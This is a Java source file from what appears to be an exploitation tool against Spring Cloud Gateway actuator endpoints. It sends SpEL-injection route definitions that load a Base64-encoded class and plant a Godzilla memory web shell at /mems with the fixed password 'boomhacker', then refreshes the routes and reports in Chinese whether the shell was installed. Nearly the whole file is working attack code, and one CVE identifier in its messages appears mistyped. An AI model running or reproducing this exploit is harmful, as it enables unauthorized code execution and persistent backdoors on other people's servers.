package src.main.memory.core;

import src.main.common.HTTPConfig;
import src.main.loadlib.MemshellLoad.MemshellLoad;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.nio.charset.StandardCharsets;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

public class ExpCore {
    String address;
    public ExpCore(String address){
        this.address = address;
    }
    public Stream<String> ShellGaw(int type) throws IOException {
        Stream.Builder<String> builder = Stream.builder();
        String res = "";
        String refapi = "";
        String api = "";
        String data = "";
        String result = "";
        if (type == 6) {
            data = "{\n" +
                    "  \"id\": \"pwnshell\",\n" +
                    "  \"filters\": [{\n" +
                    "    \"name\": \"AddResponseHeader\",\n" +
                    "    \"args\": {\n" +
                    "      \"name\": \"Result\",\n" +
                    "      \"value\": \"#{T(org.springframework.cglib.core.ReflectUtils).defineClass(\\\"GMemShell\\\",T(org.springframework.util.Base64Utils).decodeFromString('%s'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping, '/mems')}\"\n" +
                    "    }\n" +
                    "  }],\n" +
                    "  \"uri\": \"http://example.com\"\n" +
                    "}";
        }else if(type == 20) {
            data = "{\n" +
                    "  \"predicates\": [\n" +
                    "    {\n" +
                    "      \"name\": \"Path\",\n" +
                    "      \"args\": {\n" +
                    "        \"_genkey_0\": \"/actuators/pwnshell\"\n" +
                    "      }\n" +
                    "    }\n" +
                    "  ],\n" +
                    "\"filters\": [\n" +
                    "    {\n" +
                    "      \"name\": \"RewritePath\",\n" +
                    "      \"args\": {\n" +
                    "        \"_genkey_0\": \"/pwnshell\",\n" +
                    "        \"_genkey_1\": \"#{T(org.springframework.cglib.core.ReflectUtils).defineClass(\\\"GMemShell\\\",T(org.springframework.util.Base64Utils).decodeFromString('%s'),new javax.management.loading.MLet(new java.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).doInject(@requestMappingHandlerMapping, '/mems')}\"\n" +
                    "      }\n" +
                    "    }\n" +
                    "  ],\n" +
                    "\"uri\": \"http://example.com\",\n" +
                    "\"order\": -1\n" +
                    "}";
        }
        builder.add("正在上传内存马");
        MemshellLoad ms = new MemshellLoad();
        String shell = ms.run();
        String shellData = String.format(data,shell);
        HttpURLConnection conn = HTTPConfig.createConnection(address + "/actuator/env");
        conn.setRequestMethod("GET");
        conn.setDoOutput(true);
        int responseCode = conn.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK){
            api = "/actuator/gateway/routes/pwnshell";
            refapi = "/actuator/gateway/refresh";
        }else {
            api = "/gateway/routes/pwnshell";
            refapi = "/gateway/refresh";
        }
        String site = address + api;
        HttpURLConnection conn1 = HTTPConfig.createConnection(site);
        conn1.setRequestMethod("POST");
        conn1.setRequestProperty("Content-Type", "application/json");
        conn1.setDoOutput(true);
        try (OutputStream os = conn1.getOutputStream()) {
            byte[] input = shellData.getBytes(StandardCharsets.UTF_8);
            os.write(input, 0, input.length);
        }
        int responseCode1 = conn1.getResponseCode();
        if (responseCode1 == HttpURLConnection.HTTP_CREATED){
            String site1 = address + refapi;
            HttpURLConnection conn2 = HTTPConfig.createConnection(site1);
            conn2.setRequestMethod("POST");
            conn2.setRequestProperty("Content-Type","application/x-www-form-urlencoded");
            conn2.setDoOutput(true);
            int responseCode2 = conn2.getResponseCode();
            if (responseCode2 == HttpURLConnection.HTTP_OK){
                HttpURLConnection conn3 = HTTPConfig.createConnection(site);
                conn3.setRequestMethod("GET");
                conn3.setDoOutput(true);
                BufferedReader in = new BufferedReader(new InputStreamReader(conn3.getInputStream()));
                String inputLine;
                StringBuilder content = new StringBuilder();
                while ((inputLine = in.readLine()) != null) {
                    content.append(inputLine);
                    res = inputLine;
                }
                int responseCode3 = conn3.getResponseCode();
                if (responseCode3 == HttpURLConnection.HTTP_OK){
                    if (res.contains("pwnshell")) {
                        String resultPattern = "Result\\s*=\\s*'([^\\n]*)'";
                        Pattern pattern = Pattern.compile(resultPattern);
                        Matcher matcher = pattern.matcher(content.toString());
                        if (matcher.find()) {
                            if(matcher.group(1).contains("ok")) {
                                result = "CVE-2022-22497 哥斯拉GetShell成功，访问地址为/mems， 密码为boomhacker";
                            }else{
                                result = "已经上传过了，请不要重新上传了\t\t访问地址为/mems， 密码为boomhacker";
                            }
                            builder.add(result);
                        }else if (content.toString().contains("RewritePath /pwnshell")) {
                            if(content.toString().contains("RewritePath /pwnshell = 'ok'")) {
                                result = "CVE-2025-41243 哥斯拉GetShell成功，访问地址为/mems， 密码为boomhacker";
                            }else{
                                result = "已经上传过了，请不要重新上传了\t\t访问地址为/mems， 密码为boomhacker";
                            }
                            builder.add(result);
                        }
                    }else {
                        builder.add(address + "   " + "Getshell失败，请重试");
                    }
                }else{
                    builder.add("上传内存马失败: " + responseCode3);
                }
            }
        }
        return  builder.build();
    }
}
